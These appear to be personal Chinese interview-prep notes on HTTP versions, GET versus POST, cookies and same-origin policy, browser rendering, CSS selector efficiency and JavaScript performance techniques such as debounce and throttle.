![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdkwwc3ij20w60lsq7c.jpg)

这种请求的响应头中包含：

> 1. x-oss-object-type:
>    
>    Normal
> 
> 2. x-oss-request-id:
>    
>    598D5ED34F29D01FE2925F41
> 
> 3. x-oss-storage-class:
>    
>    Standard
> 
> 4. 还有其他的请看图中

所以，这样的请求返回的响应头中含有x-oss的参数决定了用户的下载行为！

## 说说 HTTP/1.1 相⽐ HTTP/1.0 提⾼了什么性能？

HTTP/1.1 相⽐ HTTP/1.0 性能上的改进：

* 使⽤ TCP ⻓连接的⽅式改善了 HTTP/1.0 短连接造成的性能开销。

* ⽀持管道（pipeline）⽹络传输，只要第⼀个请求发出去了，不必等其回来，就可以发第⼆个请求出去，可以减少整体的响应时间。

## 对于 HTTP/1.1 的性能瓶颈，HTTP2.0做了哪些优化？

> HTTP/1.1的性能瓶颈

由于HTTP发展到1.1存在诸多问题，导致需要对其进行升级

1. 队头阻塞：服务器是按请求的顺序响应的，如果服务器响应慢，会招致客户端⼀直请求不到数据，也就是队头阻塞；
2. 请求 / 响应头部（Header）未经压缩就发送，⾸部信息越多延迟越⼤。只能压缩 Body 的部分；
3. 发送冗余的⾸部。每次互相发送相同的⾸部造成的浪费较多；
4. 没有请求优先级控制；
5. 客户端需要主动请求；

> HTTP2.0

HTTP/2 协议是基于 HTTPS 的，所以 HTTP/2 的安全性也是有保障的。

* ### 数据流（解决没有请求优先级控制）
  
  HTTP/2 的数据包不是按顺序发送的，同⼀个连接⾥⾯连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。
  
  每个请求或回应的所有数据包，称为⼀个数据流（ Stream ）。每个数据流都标记着⼀个独⼀⽆⼆的编号，其中规定客户端发出的数据流编号为奇数， 服务器发出的数据流编号为偶数
  
  客户端还可以**指定数据流的优先级**。优先级⾼的请求，服务器就先响应该请求。
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzngn0jtt7j20rp0h7wga.jpg)

* ### 二进制分帧层
  
  HTTP2性能提升的核心就在于二进制分帧层。HTTP2是二进制协议，他采用二进制格式传输数据而不是1.x的文本格式
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdlx0wazj20o10cmt9n.jpg)
  
  在应用层新增一个**二进制分帧层（Binary Framing）**，用来处理所有 HTTP2.0 新增的特性，对于通过 http/2 传输的信息细分为消息和帧，使用二进制格式编码。
  
  **HTTP1.1请求是文本格式，而2.0把请求划分成了两个帧**，图中的HEADERS frame（头信息帧）和DATA frame（数据帧） 是帧的类型。也就是说一条HTTP请求，划分成了两个帧来传输，并且采用**二进制来编码**。<mark>增加数据传输的效率</mark>

* ### 多路复用（解决队头阻塞）
  
  HTTP/2 是可以在⼀个连接中<mark>并发</mark>多个请求或回应，⽽不⽤按照顺序⼀⼀对应。
  
  移除了 HTTP/1.1 中的串⾏请求，不需要排队等待，也就不会再出现「队头阻塞」问题，降低了延迟，⼤幅度提⾼了连接的利⽤率。
  
  举例来说，在⼀个 TCP 连接⾥，服务器收到了客户端 A 和 B 的两个请求，如果发现 A 处理过程⾮常耗时，于是就回应 A 请求已经处理好的部分，接着回应 B 请求，完成后，再回应 A 请求剩下的部分。
  
  <img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzngnzhq0xj20h70hyq3n.jpg" style="zoom:67%;" />

* ### 头部压缩（解决首部冗余和头部未压缩问题）
  
  HTTP/2 会压缩头（Header）如果你同时发出多个请求，他们的头是⼀样的或是相似的，那么，协议会帮你消除重复的部分。
  
  这就是所谓的 HPACK 算法：在客户端和服务器同时维护⼀张头信息表，所有字段都会存⼊这个表，⽣成⼀个索引号，以后就不发送同样字段了，只发送索引号，这样就提⾼速度了。
  
  总结：
  
  * 采用HPACK压缩格式压缩首部，而非1.0版本中的文本格式（首部未压缩）;维护一份相同的字典，减少一些相同首部字段(例如cookie、user-agent等)的发送
  
  HTTP2的静态字典是长这个样子的（只截取了部分，[完整表格在这里](https://link.juejin.cn/?target=https%3A%2F%2Fhttpwg.org%2Fspecs%2Frfc7541.html%23static.table.definition "https://httpwg.org/specs/rfc7541.html#static.table.definition")）：
  
  ![](https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/12/10/16797167fe0328dc~tplv-t2oaga2asx-watermark.awebp)

* ### 服务器端推送（解决只能客户端单向请求问题）
  
  1. 服务器可以对**一个客户端请求发送多个响应**。有别于 HTTP/1.x 定义的一个请求一个响应。
  2. HTTP/2 下**服务器可以主动推送**内容给客户端，这主要考虑场景是现在的一个网络应用会包含多种资源，可以通过服务器提前推送这些资源，从而减少客户端再次发起资源请求的延迟时间。
  
  所有服务器推送数据流都是通过 PUSH_PROMISE 帧发起，客户端接受到后可以拒绝、缓存、复用
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdmm920hj20t009jgme.jpg)

## HTTP/2 有哪些缺陷？HTTP/3 做了哪些优化？

HTTP/2 主要的问题在于，多个 HTTP 请求在复⽤⼀个 TCP 连接，下层的 TCP 协议是不知道有多少个 HTTP 请求的。所以⼀旦发⽣了丢包现象，就会触发 TCP 的重传机制，这样在⼀个 TCP 连接中的所有的 HTTP 请求都必须等待这个丢了的包被重传回来。

* HTTP/1.1 中的管道（ pipeline）传输中如果有⼀个请求阻塞了，那么队列后请求也统统被阻塞住了

* HTTP/2 多个请求复⽤⼀个TCP连接，⼀旦发⽣丢包，就会阻塞住所有的 HTTP 请求。

<mark>这都是基于 TCP 传输层的问题，所以 HTTP/3 把 HTTP 下层的 TCP 协议改成了 UDP！</mark>

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gznqsnxq8aj20lq0a63zc.jpg)

UDP 发⽣是不管顺序，也不管丢包的，所以不会出现 HTTP/1.1 的队头阻塞 和 HTTP/2 的⼀个丢包全部重传问题。

⼤家都知道 UDP 是不可靠传输的，但基于 UDP 的 QUIC 协议 可以实现类似 TCP 的可靠性传输。

* QUIC 有⾃⼰的⼀套机制可以保证传输的可靠性的。当某个流发⽣丢包时，只会阻塞这个流，其他流不会受到影响。

* TLS3 升级成了最新的 1.3 版本，头部压缩算法也升级成了 QPack 。

* HTTPS 要建⽴⼀个连接，要花费 6 次交互，先是建⽴三次握⼿，然后是 TLS/1.3 的三次握⼿。QUIC 直接把以往的 TCP 和 TLS/1.3 的 6 次交互合并成了 3 次，减少了交互次数。

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gznqu38rjsj20km0domy2.jpg)

所以， QUIC 是一个在 UDP 之上的**伪** TCP + TLS + HTTP/2 的多路复用的协议。

QUIC 是新协议，对于很多网络设备，根本不知道什么是 QUIC，只会当做 UDP，这样会出现新的问题。所以 HTTP/3 现在普及的进度非常的缓慢，不知道未来 UDP 是否能够逆袭 TCP。

参考: https://mp.weixin.qq.com/s/bUy220-ect00N4gnO0697A

## GET和POST的区别

> 常规总结

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdhlglocj218l0u0jwl.jpg)

> ==深入总结==

所以从标准上来看，GET 和 POST 的区别如下：

- GET 用于获取信息，是无副作用的，是**幂等**的，且可缓存

- POST 用于修改服务器上的数据，有副作用，**非幂等**，不可缓存
1. ## **GET 和 POST 报文上的区别**
   
   首先，结论就是**没有实质的区别**，只是报文格式不同。GET方法和POST方法只是HTTP的两种请求方式，而HTTP协议隶属于TCP/IP中的应用层，而他是基于传输层中的TCP协议，故而在传输上，没有区别。
   
   报文格式上：
   
   * **不带参数**时，最大区别就是**第一行方法名不同**
     
     POST方法请求报文第一行是这样的 `POST /uri HTTP/1.1 \r\n`
     
     GET方法请求报文第一行是这样的 `GET /uri HTTP/1.1 \r\n`
   
   * **带参数**时，在约定中，GET 方法的参数应该放在 url 中，POST 方法参数应该放在 body 中
   
   所以，两种方法本质上是 TCP 连接，没有差别，也就是说，如果我不按规范来也是可以的。我们可以在 URL 上写参数，然后方法使用 POST；也可以在 Body 写参数，然后方法使用 GET。当然，这需要服务端支持。

2. ## **GET 方法参数写法是固定的吗？**
   
   一般来说，我们的参数是写在 `?` 后面，用 `&` 分割。
   
   我们知道，**解析报文的过程是通过获取 TCP 数据，用正则等工具从数据中获取 Header 和 Body，从而提取参数。**
   
   也就是说，我们可以自己约定参数的写法，只要服务端能够解释出来就行，一种比较流行的写法是： `http://www.example.com/user/name/chengqm/age/22`。

3. ## **POST 方法比 GET 方法安全？**
   
   答案是：并不是，因为POST方法和GET方法都是HTTP的两种请求方式，而**HTTP协议本身就是明文传输，并不安全**。我们通常认为GET方法的参数会显示在浏览器URL中，而POST是将参数放在请求body中，所以POST会比GET安全，其实这是错误的，如果使用抓包工具，两种方法的参数都是可以抓取到的。
   
   要想真正做到安全，就需要使用HTTPS协议（通过SSL建立身份认证和安全传输）

4. ## **GET 方法的长度限制是怎么回事？**
   
   常规总结中提到，用GET方法，浏览器地址栏输入的参数是有限的，这是错误的说法。
   
   首先要明白，**HTTP协议没有 Body 和 URL 的长度限制，对 URL 限制的大多是浏览器和服务器的原因。**
   
   * 浏览器原因是因为GET能被缓存，如果url过于长，会让浏览器存储过大的数据，影响性能
   
   * 服务器是因为处理长 URL 要消耗比较多的资源，为了性能和安全（防止恶意构造长 URL 来攻击）考虑，会给 URL 长度加限制。

5. ## **POST 方法会产生两个TCP数据包？**
   
   有些文章中提到，post 会将 header 和 body 分开发送，先发送 header，服务端返回 100 状态码再发送 body。
   
   HTTP 协议中没有明确说明 POST 会产生两个 TCP 数据包，而且实际测试(Chrome)发现，header 和 body 不会分开发送。
   
   所以，**header 和 body 分开发送是部分浏览器或框架的请求方法，不属于 post 必然行为。**

链接：[GET和POST的区别](https://zhuanlan.zhihu.com/p/57361216)

> ==最后总结==

1. GET 用于获取数据，POST 用于修改数据
2. GET 能被缓存，POST 不能
3. 无参数时，GET 报文形式和 POST 的区别只是请求行的第一个方法名不同；有参数时，GET 的参数放在 URL 中而 POST 的参数放在 body 请求体中
4. GET 的 URL 长度被限制，是因为 GET 会被浏览器缓存，如果过长 URL 会导致浏览器存储大量数据；POST 的 body 长度也会被限制，是因为过长的 body 数据会加长服务器解析时间，影响服务器性能。 

## 在网站中输入url，都经历了什么过程

具体参看“前端性能与优化”中的内容。

## IP地址和MAC地址的区别

1. **IP地址可改动，MAC地址不可改动**（对于网络中的一些设备，路由器或者是PC及而言，IP地址的设计是出于拓扑设计出来的，只要在不重复IP地址的情况下，它是可以随意更改的；而MAC地址是根据生产厂商烧录好的，它一般不能改动的，一般来说，当一台PC机的网卡坏了之后，更换了网卡之后MAC地址就会变了）
2. IP地址的长度为32位，而MAC地址为48位
3. **它们的寻址协议层不同。IP地址应用于OSI模型的网络层，而MAC地址应用在OSI模型的数据链路层**（数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过MAC地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP根据目的IP地址，找到中间节点的MAC地址，通过中间节点传送，从而最终到达目的网络）
4. 分配依据不同。IP地址的分配是基于我们自身定义的网络拓扑，MAC地址的分配是基于制造商

## **SPDY和WebSocket的关系**

SPDY和WebSocket的关系比较复杂。

1. 补充关系，二者侧重点不同。SPDY更侧重于给Web页面的加载提速，而WebSocket更强调为Web应用提供一种双向的通讯机制以及API。
2. 竞争关系，二者解决的问题有交集，比如在服务器推送上SPDY和WebSocket都提供了方案。
3. 承载关系，试想，如果SPDY的标准化早于WebSocket，WebSocket完全可以侧重于API，利用SPDY的帧机制和多路复用机制实现该API。 Google提出草案，说WebSocket可以跑在SPDY之上。WebSocket的连接建立在SPDY的流之上，将WebSocket的帧映射到SPDY的帧上。
4. 融合关系，如微软在HTTP Speed+Mobility中所做的。

## 跨域产生的原因和解决方法

出于浏览器的同源策略限制。

**所谓同源（即在同一个域）就是两个页面具有相同的协议（protocol）、主机（host）和端口号（port）。**

同源策略（Same Orgin Policy）是一种约定，它是浏览器核心也最基本的安全功能，它会阻止一个域的js脚本和另外一个域的内容进行交互，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。

> 解决方法

1. 使用反向代理

2. 设置响应头

3. 通过JSONP

更多内容：[跨域问题](https://blog.moonlet.cn/archives/563)

## Cookie的Secure属性和HttpOnly属性

基于安全的考虑，需要给cookie加上Secure和HttpOnly属性。

* HttpOnly比较好理解，设置HttpOnly=true的cookie不能被js获取到，无法用document.cookie打出cookie的内容，防止劫取Cookie，防止了XSS攻击。

* 设置Secure属性使Cookie只能通过https协议发送。
  
  ( 如果一个cookie被设置了Secure=true，那么这个cookie只能用https协议发送给服务器，用http协议是不发送的。换句话说，cookie是在https的情况下创建的，而且他的Secure=true，那么之后你一直用https访问其他的页面（比如登录之后点击其他子页面），cookie会被发送到服务器，你无需重新登录就可以跳转到其他页面。但是如果这是你把url改成http协议访问其他页面，你就需要重新登录了，因为这个cookie不能在http协议中发送。)

## Cookie、Session、Token、JWT

技术蛋老师的视频(推荐): https://www.bilibili.com/video/BV1ob4y1Y7Ep?spm_id_from=333.337.search-card.all.click

[傻傻分不清之 Cookie、Session、Token、JWT - 掘金](https://juejin.cn/post/6844904034181070861)

# 前端性能与优化

## 为什么不推荐用多层css选择器

> #### 如何减少 CSS 选择器性能损耗？
> 
> Google 资深web开发工程师 [Steve Souders](https://link.jianshu.com/?t=http://stevesouders.com/) 对 CSS 选择器的执行效率从高到低做了一个排序：
> 
> > 1.id选择器（#myid）
> >  2.类选择器（.myclassname）
> >  3.标签选择器（div,h1,p）
> >  4.相邻选择器（h1+p）
> >  5.子选择器（ul < li）
> >  6.后代选择器（li a）
> >  7.通配符选择器（*）
> >  8.属性选择器（a[rel="external"]）
> >  9.伪类选择器（a:hover, li:nth-child）

根据以上「选择器匹配」与「选择器执行效率」原则，我们可以通过避免不恰当的使用，提升 CSS 选择器性能。

1. 避免使用通用选择器
   
   ```css
   .content * {color: red;}
   ```
   
   浏览器匹配文档中所有的元素后分别向上逐级匹配 class 为 content 的元素，直到文档的根节点。因此其匹配开销是非常大的，所以应避免使用关键选择器是通配选择器的情况。

2. 避免使用标签或 class 选择器限制 id 选择器
   
   ```css
   BAD
   button#backButton {…}
   BAD
   .menu-left#newMenuIcon {…}
   GOOD
   #backButton {…}
   GOOD
   #newMenuIcon {…}
   ```

3. 避免使用标签限制 class 选择器
   
   ```css
   BAD
   treecell.indented {…}
   GOOD
   .treecell-indented {…}
   BEST
   .hierarchy-deep {…}
   ```

4. **避免使用多层标签选择器。使用 class 选择器替换，减少css查找**
   
   ```css
   BAD
   treeitem[mailfolder="true"] > treerow > treecell {…}
   GOOD
   .treecell-mailfolder {…}
   ```

5. 避免使用子选择器
   
   ```css
   BAD
   treehead treerow treecell {…}
   BETTER, BUT STILL BAD 
   treehead > treerow > treecell {…}
   GOOD
   .treecell-header {…}
   ```

6. 使用继承
   
   ```css
   BAD 
   #bookmarkMenuItem > .menu-left { list-style-image: url(blah) }
   GOOD
   #bookmarkMenuItem { list-style-image: url(blah) }
   ```

[如何提升 CSS 选择器性能]: https://www.jianshu.com/p/268c7f3dd7a6

## **浏览器是如何渲染网页的**（伴随问题！）

> 浏览器开发团队的图

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gvg8j8qfzuj60hc08174k02.jpg" style="zoom:120%;" />

> 自画图（不完整了，后面有完整的）

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gvgbrxefc3j321n0u0znl.jpg" style="zoom:100%;" />

通过图，我们可以知道浏览器是将我们的静态资源`HTML`文件通过`HTML Parser`解析成`DOM Tree`，在建立`Render Tree`时，浏览器会为`DOM Tree`中的`DOM`元素根据`CSS`的解析结果（`Style Rules`）来确定生成怎样的`Render Object`。对于每个DOM元素，必须在所有`Style Rules`中找到符合的`selector`并将对应的规则进行合并。选择器的==解析（后面有一个相关问题）==实际是在这里执行的。

![img](http://www.nowamagic.net/librarys/images/201405/2014_05_04_02.gif)

基于DOM树的一些可视（visual）的节点，WebKit来根据需要来创建相应的RenderObject节点，这些节点也构成了一颗树，称之为**Render树**。基于Render树，WebKit也会根据需要来为它们中的某些节点创建新的RenderLayer节点，从而形成一棵RenderLayer树。

Render树和RenderLayer树是WebKit支持渲染所提供的基础但是却非常重要的设施。这是因为WebKit的布局计算依赖它们，浏览器的渲染和GPU硬件加速也都依赖于它们。幸运地是，得益于它们接口定义的灵活性，不同的浏览器可以很方便地来实现自己的渲染和加速机制。

> Render Tree 的建立

是基于DOM树建立的一颗新的树，Render树节点与DOM树节点不是一一对应关系：

* DOM树的document节点需要建立Render节点；
* DOM树中的可视化节点，例如HTML，BODY，DIV等，非可视化节点不会建立Render树节点，例如HEAD，META，SCRIPT等；
* 某些情况下需要建立匿名的Render节点，该节点不对应于DOM树中的任何节点；

> 参考资料

[浏览器是如何渲染网页的]: https://zhuanlan.zhihu.com/p/25554352
[为什么排版引擎解析 CSS 选择器时一定要从右往左解析？]: https://www.zhihu.com/question/20185756
[浏览器渲染原理与过程]: https://www.jianshu.com/p/e6252dc9be32
[how browsers work]: http://taligarsiel.com/Projects/howbrowserswork1.htm
[WebKit渲染基础之Render树的建立]: https://www.zhoulujun.cn/html/webfront/browser/webkit/2015_1213_357.html

### 什么是重绘和回流

> 重绘（Repaint）

当页面元素样式的改变不影响元素在文档流中的位置时（例如**background-color, border-color,visibility**）,浏览器只会将新样式赋予元素并进行重绘操作。（==在Painting阶段==）

> 回流（Reflow）

当改变影响文档内容或者结构，或者元素位置时，回流操作就会被触发（==Layout阶段==）一般有以下几种情况：

- DOM操作（对元素的增删改，顺序变化等）；
- 内容变化，包括表单区域内的文本改变；
- CSS属性的更改或重新计算；
- 增删样式表内容；
- 修改class属性；
- 浏览器窗口变化（滚动或缩放）；
- 伪类样式激活（**:hover**等）。

> 因为浏览器的渲染是先经过`Layout`然后才是`Painting`，所以==重绘不一定会引起回流，但是回流一定引起重绘！==    

### 强制回流的例子

获取某个元素的属性会触发强制回流

[强制回流的🌰]: http://output.jsbin.com/qutev/1/

### ==排版引擎解析CSS选择器时要从右往左解析==

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gvgcfyi9gtj60zm0lotaq02.jpg" style="zoom:57%;" />

例如找 `#next div`

因为正向解析，先从`body`开始遍历，然后到`#header`，然后找`#header`的第一个孩子节点`a`，如果不是要找的，回溯到前一个节点，然后一直这样找，直到找到`#next`下的`div`标签。通过这样的回溯算法，执行效率是很低的！

但是如果通过逆向解析，自下而上的去匹配，先从最右边的`a`标签开始，因为要找的是`div`，所以直接排除，然后是下一个div标签，满足一个情况，接着网上看他的父元素，发现是`#header`，和我要找的`#next`不匹配，再排除，然后依次往后这样去遍历，这样的时间复杂度就是`O(n)`，比前一种效率高很多。(==这一段的解释感觉不太正确！！==)

## ==从浏览器地址栏输入URL到页面显示的过程，浏览器都经历了什么？==

一个分为四个部分：

1. 网络线程的开启（网络进程发起请求并从服务器下载静态资源）
2. 建立 HTTP 连接（ DNS 解析、TCP 连接）
3. 前后端交互（反响代理服务器、涉及 HTTP 特性、强缓存和协商缓存）
4. 页面渲染（对第三步中获取的 HTML、CSS、JS 资源进行布局渲染）

![](https://tva1.sinaimg.cn/large/008i3skNly1gw5haljfirj310q0otwgj.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNly1gw5h9o5h8mj30yw0q70u7.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNgy1gw6pwnxw4mj325c0e80u7.jpg)

涉及到 JS 处理在最前面的原因，去看阻塞渲染！

## ==浏览器是怎样解析HTML页面的？==

整个`DOM`的解析过程是顺序的，并且`渐进式`的。

`渐进式`指的是浏览器会迫不及待的将解析完成的部分显示出来，如果我们做下面这个实验会发现，在`断点`处第一个`div`已经在浏览器渲染出来了：

```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <div>
        first div
    </div>
    <script>
        debugger
    </script>
    <div>
        second div
    </div>
</body>
</html>
```

### CSS的阻塞情况

1. css不会阻塞dom的解析

2. css会阻塞dom的渲染

3. css会阻塞js（js会阻塞dom，从而间接阻塞dom解析，但前提是js之前的css）

### 阻塞dom的解析型

1. 内联 js

2. 外联普通 js

3. **js 标签之前的 css**（js 需要等前面的 css `<内联或外联>`加载完毕后，才开始执行，而 js 会阻塞`dom树`的解析，所以外联css 会间接阻塞`dom树`的解析）

### 不阻塞dom的解析型

1. image、iframe、audio

2. 外联 async js（**其实这里是可能阻塞，也可能不阻塞，需要根据 js 脚本的下载结束时间来决定**）

3. **外联 defer js**（`defer javascript`是在`dom树`构建完成后，`DOMContentLoaded`事件派发之前请求并执行的）

4. js 标签之后的 css

### 外联 js 的三种加载过程

- 外联普通javascript

```html
<script src="indx.js"></script>
```

- 外联defer javascript

```html
<script defer src="indx.js"></script>
```

- 外联async javascript

```html
<script async src="indx.js"></script>
```

如下图所示，绿色表示`html`解析；灰色表示`html`解析暂停；紫色表示`外联javascript`加载；粉色表示`javascript执行`。

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc7i06ajj20ji04jwei.jpg)

第一种外联普通 js，会阻塞`dom树`的解析。加载执行过程如下：

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc8viqfwj20lb02wq2u.jpg)

第二种外联 defer js 不阻塞 html 解析，而是会暂存到一个队列中，等整个 html 解析完成后，再按照队列的顺序请求并执行 js，但是<mark>这种外联 defer js 全部加载并执行完成后才会派发`DOMContentLoaded`事件</mark>，加载过程如下：

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmcc8fxwvj20la02q746.jpg)

**第三种外联 async js 不阻塞 html 的解析过程，但是这里说的只是在 js 下载的过程不阻塞 html 的解析，如果 js 下载完成后 html 还没有解析完，则会暂停 html 解析，先执行下载完的 js ，然后再继续解析 html。过程如下：**

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmcfqonmbj20lc02kglj.jpg)

详细情况：

[css加载会造成阻塞吗？](https://zhuanlan.zhihu.com/p/43282197)

[浏览器是如何解析html的？ - 掘金](https://juejin.cn/post/6844903745730396174)

## `window.onload`和`DOMContentLoaded`有什么区别？

* `window.onload`事件是在所有资源都加载完成（这些资源包括css、js、图片视频等）后，才执行

* html文档加载并解析完成，但是图片等资源还未完成加载，触发`DOMContentLoaded`事件
  
  但是实际上对于`DOMContentLoaded`事件还是分两种情况：
  
  1. 如果页面中同时存在 js 和 css，并且 js 在 css 后面，则`DOMContentLoaded`事件会在 css 加载完后才执行
  
  2. 其他情况，`DOMContentLoaded`都不会等待css加载，并且DOMContentLoaded事件也不会等待图片、视频等其他资源加载。

[css加载会造成阻塞吗？](https://zhuanlan.zhihu.com/p/43282197)

## 高性能代码

### 条件判断

* 当要匹配的条件仅为一两个离散值时，或者容易划分不同取值范围时，使用 if-else 语句
* 当要匹配的条件超过一两个但少于十个离散值，使用 switch 语句
* 超过十个，使用基于数组索引或者对象属性的查找方式

### 循环语句

* `for-of`性能优于 `for-in`和`forEach`，但是逊色于三种常规循环语句（for、while、do-while）
* 任何的递归都可转化为迭代，使用递归需要考虑浏览器对调用栈的大小限制

### 字符串处理

```js
function foo1() {
    let len = 2000;
    let str = '';
    while(len--) {
        str += 'a' + 'b';
    }
}

function foo2() {
    let len = 2000;
    let str = '';
    while(len--) {
        str = str + 'a' + 'b';
    }
}
```

函数 foo1的 while 循环中需要我们先创建一个临时变量用来存储 'ab'，然后再将这个临时变量和 str 变量进行拼接，最后再赋值给变量 str

而在函数 foo2 中，我们不需要去创建一个临时变量来存储 'ab'，而是直接将 'ab' 和 str 进行拼接，这在大部分浏览器中，将会提高 20% 的执行速度

### 浏览器的限制

引起 JS 执行时间过长的原因：

1. 对 DOM 的频繁修改
2. 不恰当的循环
3. 过深的递归

虚拟 DOM ：就是将真实的 DOM 抽象为 JS 对象，让 JS 对象去执行修改的中间过程，最后统一修改，这样就降低了频繁的操作 DOM 所带来的性能影响。

### **异步任务优化长线任务**

异步任务中的事件循环机制，这里不过多赘述，主要是讲利用异步任务对复杂计算（长任务）进行拆分处理，优化单线程的 JS 引擎执行效率

> 不阻塞页面渲染的快速响应

当我们创建一个异步任务后，它并没有马上执行，而是被 JS 引擎放置到一个队列中，当执行完一个任务脚本后，JS 引擎便会挂起让浏览器去做其他工作，比如更新页面，当页面更新完成后，JS 引擎便会查看任务队列，并取出一个任务执行。

据此我们便有了对执行长任务的一种优化策略，将一个长任务拆分为多个异步任务，从而让浏览器给刷新页面留出时间。

```js
function process(n) {
    // 模拟复杂计算
    let sum = 0;
    for(let i = 0; i < n; i++) {
        sum += i;
    }
    console.log(sum);
}

// 模拟将复杂的程序拆分话
function bigProcedure(arr) {
    setTimeout(() => {
        // 将复杂任务拆分执行
        const item = arr.shift();
        process(item);
        if(arr.length > 0) {
            setTimeout(bigProcedure(arr), 100)
            // setTimeout(arguments.callee(arr), 100)
        }

    },100)   // 设置100ms是因为这在用户的感知卡顿时间内
}

bigProcedure([10,20,30,40,50])
// 45
// 190
// 435
// 780
// 1225
```

### 避免多重求值

```js
/* 
    避免多重求值
*/
const a = 1, b = 2;
let result = 0;
setTimeout("result = a + b", 100);
setInterval("result = a + b", 100);
result = eval("a + b");
result = new Function("a", "b", "result = a + b");
```

以上代码，首先会以正常的方式进行一次求值，接着在执行过程中对字符串的代码进行一次额外的求值运算

### 使用位操作

```js
// 不使用位运算
let sum = 0;
for(let i = 0; i < 10; i++) {
    if(i % 2 == 0) {  // 找到偶数
        sum += i;
    }
}
console.log(sum);
```

```js
// 使用位运算
let sum = 0;
for(let i = 0; i < 10; i++) {
    if((i & 1) == 0) {   // 找到偶数
        sum += i;
    }
}
console.log(sum);
```

位操作通常发生在系统底层，可以极大的代码的执行效率。

### 使用原生方法

原生方法是我们在编写 JS 代码之前就已经存在于浏览器中，并且大多数都是用更底层的语言实现的，可以被编译成执行效率更高的机器码，所以我们要尽量的使用原生方法。而非自我编写的一些 JS 代码

## 渲染优化

### ==阻塞渲染==

JS可以操作DOM来修改DOM结构，可以操作CSSOM来修改节点样式，这就导致了浏览器在遇到`<script>`标签时，DOM构建将暂停，直至脚本完成执行，然后继续构建DOM。如果脚本是外部的，会等待脚本下载完毕，再继续解析文档。现在可以在`script`标签上增加属性`defer`或者`async`。脚本解析会将脚本中改变DOM和CSS的地方分别解析出来，追加到DOM树和CSSOM规则树上。

每次去执行JavaScript脚本都会严重地阻塞DOM树的构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM还没有下载和构建，浏览器甚至会延迟脚本执行和构建DOM，直至完成其CSSOM的下载和构建。所以，`script`标签的位置很重要。

JS阻塞了构建DOM树，也阻塞了其后的构建CSSOM规则树，整个解析进程必须等待JS的执行完成才能够继续，这就是所谓的JS阻塞页面。

由于CSSOM负责存储渲染信息，浏览器就必须保证在合成渲染树之前，CSSOM是完备的，这种完备是指所有的CSS（内联、内部和外部）都已经下载完，并解析完，只有CSSOM和DOM的解析完全结束，浏览器才会进入下一步的渲染，这就是CSS阻塞渲染。

CSS阻塞渲染意味着，在CSSOM完备前，页面将一直处理白屏状态，这就是为什么样式放在`head`中，仅仅是为了更快的解析CSS，保证更快的首次渲染。

需要注意的是，即便你没有给页面任何的样式声明，CSSOM依然会生成，默认生成的CSSOM自带浏览器默认样式。

当解析HTML的时候，会把新来的元素插入DOM树里面，同时去查找CSS，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序去匹配的。

例如：`div p {font-size: 16px}`，会先寻找所有`p`标签并判断它的父标签是否为`div`之后才会决定要不要采用这个样式进行渲染）。
所以，我们平时写CSS时，尽量用`id`和`class`，千万不要过渡层叠。

### JS 动画优化

```js
let start;
// 定义目标动画元素
const element = document.getElementById('myAnimate');
element.style.position = 'absolute';

// 定义动画回调函数
function updateScreen(timestamp) {
    if(!start) start = timestamp;
    // 根据时间戳计算每次动画位移
    const progress = timestamp - start;
    element.style.left = `${Math.min(progress / 10, 200)}px`;
    if(progress < 2000) window.requestAnimationFrame(updateScreen);
}

// 启动动画回调函数
window.requestAnimationFrame(updateScreen);
```

使用 window.requestAnimationFrame 比使用 setInterval 去设置动画更优。

1. window.requestAnimationFrame 的执行时机与系统的刷新频率同步
2. 当页面会激活时，屏幕刷新任务会被系统暂停（而 setInterval 需要显示的销毁定时器）

### 事件防抖与节流

> 节流

```js
window.onscroll = foo(function(){
    // 业务代码
    console.log(123);
},1000);

function foo(fn, delay) {
    // 设置定时器
    var timer = null;
    return function() {
        // 当不存在定时器时，我们为其设置一个定时器，并进行执行内容
        if(!timer) {
            timer = setTimeout(() => {
                // 执行内容
                fn();
                clearTimeout(timer);
                timer = null;
            }, delay);
        }else {   // 定时器存在时，直接返回
            return false;
        }
    }
}
```

> 防抖

```js
let inputitem = document.getElementById('inputitem');
inputitem.oninput = bar(function(){
    console.log(this.value);
},400);

function bar(fn, timeout) {
    let timer = null;
    return function () {
        // 有就清理掉
        if (timer) {
            clearTimeout(timer);
        };

        timer = setTimeout(() => {
            fn.call(this);
        }, timeout || 700);

    }
}
```

### 使用 BEM 规范（简化样式查找）

一种CSS书写规范

### ==减少回流和重绘==

导致回流的原因：

1. 对 DOM 元素几何属性的修改（例如 width、height、padding、top）
2. 对 DOM 树的结构进行更改
3. 获取某些特定的属性值（例如 offsetTop、offsetLeft、offsetWidth等）

减少的方式：

1. 使用类名对样式逐条修改
   
   ```js
   // 获取 DOM，逐行修改
   const div = document.getElementById('mydiv');
   div.style.height = '100px';
   div.style.width = '200px';
   div.style.border = '2px solid blue';
   ```
   
   上面的方式，每一行都会触发一次渲染树的更改，导致多次回流。更好的做法是
   
   ```css
   .mydiv {
       height: 100px;
       width: 200px;
       border: 2px solid blue;
   }
   ```
   
   然后统一添加类
   
   ```js
   const div = document.getElementById('mydiv');
   div.classList.add('mydiv');
   ```

2. 缓存对敏感属性值的计算
   
